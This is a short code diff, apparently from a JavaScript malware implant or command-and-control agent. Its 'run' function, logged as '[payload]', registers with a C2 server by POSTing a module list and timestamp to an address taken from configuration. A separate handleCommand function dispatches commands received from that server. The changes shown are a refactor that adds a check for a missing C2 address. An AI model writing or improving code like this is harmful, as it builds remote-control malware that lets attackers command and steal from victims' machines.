@@ -2,13 +2,22 @@
 window.run = function(cfg) {
   console.log("[payload] run() started with cfg:", cfg);
 
+  if (!cfg?.c2) {
+    console.warn("[payload] No C2 address provided in cfg");
+    return;
+  }
+
+  const payload = {
+    modules: cfg.modules || [],
+    timestamp: new Date().toISOString()
+  };
+
   fetch(cfg.c2 + "/api/register", {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      modules: cfg.modules || [],
-      timestamp: new Date().toISOString()
-    })
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(payload)
   })
     .then(res => res.text())
     .then(text => {
@@ -251,3 +260,4 @@ async function handleCommand(command) {
       console.warn('[Unknown Command]', command.type);
   }
 }
+
